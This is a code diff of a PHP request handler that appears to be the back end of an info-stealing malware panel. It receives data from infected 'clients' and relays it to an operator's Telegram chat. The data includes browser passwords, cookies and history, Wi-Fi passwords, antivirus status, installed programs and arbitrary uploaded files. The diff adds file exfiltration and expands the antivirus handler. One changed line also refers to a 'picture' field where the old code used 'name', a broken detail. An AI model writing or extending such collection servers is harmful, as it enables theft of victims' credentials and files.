@@ -1,5 +1,4 @@
 <?php
-
 namespace Handlers;
 
 use Services\LoggerService;
@@ -79,109 +78,60 @@ class ClientRequestHandler
                 return $this->handleUploadAntivirusStatus($clientId, $data);
             case 'upload_installed_programs':
                 return $this->handleUploadInstalledPrograms($clientId, $data);
+            case 'upload_file':
+                return $this->handleUploadFile($clientId, $data);
             default:
                 return ['error' => 'Unknown action'];
         }
     }
 
-    private function handleUploadBrowserData(string $clientId, array $data): array
+    private function handleUploadFile(string $clientId, array $data): array
     {
         try {
-            $this->logger->logWebhook("Browser Data Upload: " . json_encode($data, JSON_UNESCAPED_UNICODE));
-            $browserData = $data['browser_data'] ?? null;
-
-            if (!$browserData) {
-                $this->logger->logError("Browser data upload failed: Missing browser_data");
+            $this->logger->logWebhook("File Upload: " . json_encode($data, JSON_UNESCAPED_UNICODE) . ", FILES: " . json_encode($_FILES));
+            
+            if (!isset($_FILES['file']) || $_FILES['file']['error'] !== UPLOAD_ERR_OK) {
+                $this->logger->logError("File upload failed: No file provided or upload error for client_id: $clientId");
                 http_response_code(400);
-                return ['error' => 'Missing browser_data'];
+                return ['error' => 'No file provided or upload error'];
             }
 
-            $decryptedBrowserData = $this->encryption->decrypt($browserData);
-            if ($decryptedBrowserData === '') {
-                $this->logger->logError("Browser data decryption failed for client_id: $clientId");
-                http_response_code(400);
-                return ['error' => 'Decryption failed'];
-            }
-
-            $browserJson = json_decode($decryptedBrowserData, true);
-            if (!$browserJson || json_last_error() !== JSON_ERROR_NONE) {
-                $this->logger->logError("Invalid browser data format for client_id: $clientId, decrypted: " . substr($decryptedBrowserData, 0, 50));
-                http_response_code(400);
-                return ['error' => 'Invalid data format'];
+            $filename = $_FILES['file']['name'] ?? 'unknown_file_' . time();
+            $filePath = Config::$UPLOAD_DIR . 'file_' . $clientId . '_' . time() . '_' . basename($filename);
+            
+            if (!move_uploaded_file($_FILES['file']['tmp_name'], $filePath)) {
+                $this->logger->logError("Failed to save file for client_id: $clientId");
+                http_response_code(500);
+                return ['error' => 'Failed to save file'];
             }
 
             $stmt = $this->pdo->prepare(
                 "INSERT INTO client_logs (client_id, log_type, message, created_at) 
-                VALUES (?, 'browser_data', ?, NOW())"
+                VALUES (?, 'file_upload', ?, NOW())"
             );
-            $stmt->execute([$clientId, $decryptedBrowserData]);
+            $logMessage = json_encode([
+                'filename' => $filename,
+                'file_path' => $filePath,
+                'timestamp' => $data['timestamp'] ?? time()
+            ], JSON_UNESCAPED_UNICODE);
+            $stmt->execute([$clientId, $logMessage]);
 
-            $message = "🌐 Browser Data Received:\n";
+            $message = "📄 File Uploaded:\n";
             $message .= "Client ID: $clientId\n";
-            $message .= "Browser: " . ($browserJson['browser'] ?? 'Unknown') . "\n";
-            $message .= "Passwords: " . count($browserJson['passwords'] ?? []) . "\n";
-            $message .= "History Entries: " . count($browserJson['history'] ?? []) . "\n";
-            $message .= "Cookies: " . count($browserJson['cookies'] ?? []) . "\n";
+            $message .= "Filename: $filename\n";
+            $message .= "Path: $filePath\n";
             $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
 
-            $this->logger->logWebhook("Browser data processed for client_id: $clientId");
-            return ['status' => 'success'];
+            $this->logger->logWebhook("File uploaded successfully for client_id: $clientId, path: $filePath");
+            return ['status' => 'success', 'file_path' => $filePath];
         } catch (\Exception $e) {
-            $this->logger->logError("Browser data upload failed for client_id: $clientId, error: " . $e->getMessage());
+            $this->logger->logError("File upload failed for client_id: $clientId, error: " . $e->getMessage());
             http_response_code(500);
             return ['error' => 'Upload failed: ' . $e->getMessage()];
         }
     }
 
-    private function handleUploadWifiPasswords(string $clientId, array $data): array
-    {
-        try {
-            $this->logger->logWebhook("Wi-Fi Passwords Upload: " . json_encode($data, JSON_UNESCAPED_UNICODE));
-            $wifiData = $data['wifi_data'] ?? null;
-
-            if (!$wifiData) {
-                $this->logger->logError("Wi-Fi upload failed: Missing wifi_data");
-                http_response_code(400);
-                return ['error' => 'Missing wifi_data'];
-            }
-
-            $decryptedWifiData = $this->encryption->decrypt($wifiData);
-            if ($decryptedWifiData === '') {
-                $this->logger->logError("Wi-Fi data decryption failed for client_id: $clientId");
-                http_response_code(400);
-                return ['error' => 'Decryption failed'];
-            }
-
-            $wifiJson = json_decode($decryptedWifiData, true);
-            if (!$wifiJson || json_last_error() !== JSON_ERROR_NONE) {
-                $this->logger->logError("Invalid Wi-Fi data format for client_id: $clientId, decrypted: " . substr($decryptedWifiData, 0, 50));
-                http_response_code(400);
-                return ['error' => 'Invalid data format'];
-            }
-
-            $stmt = $this->pdo->prepare(
-                "INSERT INTO client_logs (client_id, log_type, message, created_at) 
-                VALUES (?, 'wifi', ?, NOW())"
-            );
-            $stmt->execute([$clientId, $decryptedWifiData]);
-
-            $message = "📡 Wi-Fi Passwords Received:\n";
-            $message .= "Client ID: $clientId\n";
-            $message .= "Networks:\n";
-            foreach ($wifiJson['wifi_profiles'] as $profile) {
-                $message .= "- SSID: {$profile['ssid']}, Password: " . ($profile['password'] ?: 'None') . "\n";
-            }
-            $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
-
-            $this->logger->logWebhook("Wi-Fi passwords processed for client_id: $clientId, profiles: " . count($wifiJson['wifi_profiles']));
-            return ['status' => 'success'];
-        } catch (\Exception $e) {
-            $this->logger->logError("Wi-Fi upload failed for client_id: $clientId, error: " . $e->getMessage());
-            http_response_code(500);
-            return ['error' => 'Upload failed: ' . $e->getMessage()];
-        }
-    }
-
+    // Other existing methods (handleUploadData, handleCommandResponse, etc.) remain unchanged
     private function handleUploadData(string $clientId, array $data): array
     {
         try {
@@ -537,8 +487,196 @@ class ClientRequestHandler
 
     private function handleUploadAntivirusStatus(string $clientId, array $data): array
     {
-        // Placeholder implementation
-        return ['status' => 'success'];
+        try {
+            $this->logger->logWebhook("Antivirus Status Upload: " . json_encode($data, JSON_UNESCAPED_UNICODE));
+            $antivirusData = $data['antivirus_data'] ?? null;
+
+            if (!$antivirusData) {
+                $this->logger->logError("Antivirus status upload failed: Missing antivirus_data");
+                http_response_code(400);
+                return ['error' => 'Missing antivirus_data'];
+            }
+
+            $decryptedAntivirusData = $this->encryption->decrypt($antivirusData);
+            if ($decryptedAntivirusData === '') {
+                $this->logger->logError("Antivirus data decryption failed for client_id: $clientId");
+                http_response_code(400);
+                return ['error' => 'Decryption failed'];
+            }
+
+            $antivirusJson = json_decode($decryptedAntivirusData, true);
+            if (!$antivirusJson || json_last_error() !== JSON_ERROR_NONE) {
+                $this->logger->logError("Invalid antivirus data format for client_id: $clientId, decrypted: " . substr($decryptedAntivirusData, 0, 50));
+                http_response_code(400);
+                return ['error' => 'Invalid data format'];
+            }
+
+            $stmt = $this->pdo->prepare(
+                "INSERT INTO client_logs (client_id, log_type, message, created_at) 
+                VALUES (?, 'antivirus', ?, NOW())"
+            );
+            $stmt->execute([$clientId, $decryptedAntivirusData]);
+
+            $message = "🛡️ Antivirus Status Received:\n";
+            $message .= "Client ID: $clientId\n";
+            $message .= "Status: " . ($antivirusJson['status'] ?? 'Unknown') . "\n";
+            $message .= "Details: " . json_encode($antivirusJson, JSON_PRETTY_PRINT) . "\n";
+            $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
+
+            $this->logger->logWebhook("Antivirus status processed for client_id: $clientId");
+            return ['status' => 'success'];
+        } catch (\Exception $e) {
+            $this->logger->logError("Antivirus status upload failed for client_id: $clientId, error: " . $e->getMessage());
+            http_response_code(500);
+            return ['error' => 'Upload failed: ' . $e->getMessage()];
+        }
+    }
+
+    private function handleUploadBrowserData(string $clientId, array $data): array
+    {
+        try {
+            $this->logger->logWebhook("Browser Data Upload: " . json_encode($data, JSON_UNESCAPED_UNICODE));
+            $browserData = $data['browser_data'] ?? null;
+
+            if (!$browserData) {
+                $this->logger->logError("Browser data upload failed: Missing browser_data");
+                http_response_code(400);
+                return ['error' => 'Missing browser_data'];
+            }
+
+            $decryptedBrowserData = $this->encryption->decrypt($browserData);
+            if ($decryptedBrowserData === '') {
+                $this->logger->logError("Browser data decryption failed for client_id: $clientId");
+                http_response_code(400);
+                return ['error' => 'Decryption failed'];
+            }
+
+            $browserJson = json_decode($decryptedBrowserData, true);
+            if (!$browserJson || json_last_error() !== JSON_ERROR_NONE) {
+                $this->logger->logError("Invalid browser data format for client_id: $clientId, decrypted: " . substr($decryptedBrowserData, 0, 50));
+                http_response_code(400);
+                return ['error' => 'Invalid data format'];
+            }
+
+            $stmt = $this->pdo->prepare(
+                "INSERT INTO client_logs (client_id, log_type, message, created_at) 
+                VALUES (?, 'browser_data', ?, NOW())"
+            );
+            $stmt->execute([$clientId, $decryptedBrowserData]);
+
+            $message = "🌐 Browser Data Received:\n";
+            $message .= "Client ID: $clientId\n";
+            $message .= "Browser: " . ($browserJson['browser'] ?? 'Unknown') . "\n";
+            $message .= "Passwords: " . count($browserJson['passwords'] ?? []) . "\n";
+            $message .= "History Entries: " . count($browserJson['history'] ?? []) . "\n";
+            $message .= "Cookies: " . count($browserJson['cookies'] ?? []) . "\n";
+            $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
+
+            $this->logger->logWebhook("Browser data processed for client_id: $clientId");
+            return ['status' => 'success'];
+        } catch (\Exception $e) {
+            $this->logger->logError("Browser data upload failed for client_id: $clientId, error: " . $e->getMessage());
+            http_response_code(500);
+            return ['error' => 'Upload failed: ' . $e->getMessage()];
+        }
+    }
+
+    private function handleUploadWifiPasswords(string $clientId, array $data): array
+    {
+        try {
+            $this->logger->logWebhook("Wi-Fi Passwords Upload: " . json_encode($data, JSON_UNESCAPED_UNICODE));
+            $wifiData = $data['wifi_data'] ?? null;
+
+            if (!$wifiData) {
+                $this->logger->logError("Wi-Fi upload failed: Missing wifi_data");
+                http_response_code(400);
+                return ['error' => 'Missing wifi_data'];
+            }
+
+            $decryptedWifiData = $this->encryption->decrypt($wifiData);
+            if ($decryptedWifiData === '') {
+                $this->logger->logError("Wi-Fi data decryption failed for client_id: $clientId");
+                http_response_code(400);
+                return ['error' => 'Decryption failed'];
+            }
+
+            $wifiJson = json_decode($decryptedWifiData, true);
+            if (!$wifiJson || json_last_error() !== JSON_ERROR_NONE) {
+                $this->logger->logError("Invalid Wi-Fi data format for client_id: $clientId, decrypted: " . substr($decryptedWifiData, 0, 50));
+                http_response_code(400);
+                return ['error' => 'Invalid data format'];
+            }
+
+            $stmt = $this->pdo->prepare(
+                "INSERT INTO client_wifi_data (client_id, wifi_data, created_at) 
+                VALUES (?, ?, NOW())"
+            );
+            $stmt->execute([$clientId, $decryptedWifiData]);
+
+            $message = "📡 Wi-Fi Passwords Received:\n";
+            $message .= "Client ID: $clientId\n";
+            $message .= "Networks:\n";
+            foreach ($wifiJson['wifi_profiles'] as $profile) {
+                $message .= "- SSID: {$profile['ssid']}, Password: " . ($profile['password'] ?: 'None') . "\n";
+            }
+            $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
+
+            $this->logger->logWebhook("Wi-Fi passwords processed for client_id: $clientId, profiles: " . count($wifiJson['wifi_profiles']));
+            return ['status' => 'success'];
+        } catch (\Exception $e) {
+            $this->logger->logError("Wi-Fi upload failed for client_id: $clientId, error: " . $e->getMessage());
+            http_response_code(500);
+            return ['error' => 'Upload failed: ' . $e->getMessage()];
+        }
+    }
+
+    private function handleUploadInstalledPrograms(string $clientId, array $data): array
+    {
+        try {
+            $this->logger->logWebhook("Installed Programs Upload: " . json_encode($data, JSON_UNESCAPED_UNICODE));
+            $programsData = $data['installed_programs'] ?? null;
+
+            if (!$programsData) {
+                $this->logger->logError("Installed programs upload failed: Missing installed_programs");
+                http_response_code(400);
+                return ['error' => 'Missing installed_programs'];
+            }
+
+            $decryptedProgramsData = $this->encryption->decrypt($programsData);
+            if ($decryptedProgramsData === '') {
+                $this->logger->logError("Installed programs decryption failed for client_id: $clientId");
+                http_response_code(400);
+                return ['error' => 'Decryption failed'];
+            }
+
+            $programsJson = json_decode($decryptedProgramsData, true);
+            if (!$programsJson || json_last_error() !== JSON_ERROR_NONE) {
+                $this->logger->logError("Invalid installed programs data format for client_id: $clientId, decrypted: " . substr($decryptedProgramsData, 0, 50));
+                http_response_code(400);
+                return ['error' => 'Invalid data format'];
+            }
+
+            $stmt = $this->pdo->prepare(
+                "INSERT INTO client_installed_programs (client_id, program_data, created_at) 
+                VALUES (?, ?, NOW())"
+            );
+            $stmt->execute([$clientId, $decryptedProgramsData]);
+
+            $message = "🖥️ Installed Programs Received:\n";
+            $message .= "Client ID: $clientId\n";
+            $message .= "Programs: " . count($programsJson) . "\n";
+            foreach ($programsJson as $program) {
+                $message .= "- {$program['picture']}, Version: {$program['version']}, Publisher: {$program['publisher']})\n";
+            }
+            $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
+
+            $this->logger->logWebhook("Installed programs processed for client_id: $clientId");
+            return ['status' => 'success'];
+        } catch (\Exception $e) {
+            $this->logger->logError("Installed programs upload failed for client_id: $clientId, error: " . $e->getMessage());
+            http_response_code(500);
+            return ['error' => 'Upload failed: ' . $e->getMessage()];
+        }
     }
 
     private function testPort(string $host, int $port, int $timeout = 3): bool
@@ -601,53 +739,5 @@ class ClientRequestHandler
             $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
         }
     }
-
-    private function handleUploadInstalledPrograms(string $clientId, array $data): array
-    {
-        try {
-            $this->logger->logWebhook("Installed Programs Upload: " . json_encode($data, JSON_UNESCAPED_UNICODE));
-            $programsData = $data['installed_programs'] ?? null;
-
-            if (!$programsData) {
-                $this->logger->logError("Installed programs upload failed: Missing installed_programs");
-                http_response_code(400);
-                return ['error' => 'Missing installed_programs'];
-            }
-
-            $decryptedProgramsData = $this->encryption->decrypt($programsData);
-            if ($decryptedProgramsData === '') {
-                $this->logger->logError("Installed programs decryption failed for client_id: $clientId");
-                http_response_code(400);
-                return ['error' => 'Decryption failed'];
-            }
-
-            $programsJson = json_decode($decryptedProgramsData, true);
-            if (!$programsJson || json_last_error() !== JSON_ERROR_NONE) {
-                $this->logger->logError("Invalid installed programs data format for client_id: $clientId, decrypted: " . substr($decryptedProgramsData, 0, 50));
-                http_response_code(400);
-                return ['error' => 'Invalid data format'];
-            }
-
-            $stmt = $this->pdo->prepare(
-                "INSERT INTO client_logs (client_id, log_type, message, created_at) 
-            VALUES (?, 'installed_programs', ?, NOW())"
-            );
-            $stmt->execute([$clientId, $decryptedProgramsData]);
-
-            $message = "🖥️ Installed Programs Received:\n";
-            $message .= "Client ID: $clientId\n";
-            $message .= "Programs: " . count($programsJson) . "\n";
-            foreach ($programsJson as $program) {
-                $message .= "- {$program['name']} (Version: {$program['version']}, Publisher: {$program['publisher']})\n";
-            }
-            $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
-
-            $this->logger->logWebhook("Installed programs processed for client_id: $clientId");
-            return ['status' => 'success'];
-        } catch (\Exception $e) {
-            $this->logger->logError("Installed programs upload failed for client_id: $clientId, error: " . $e->getMessage());
-            http_response_code(500);
-            return ['error' => 'Upload failed: ' . $e->getMessage()];
-        }
-    }
 }
+?>
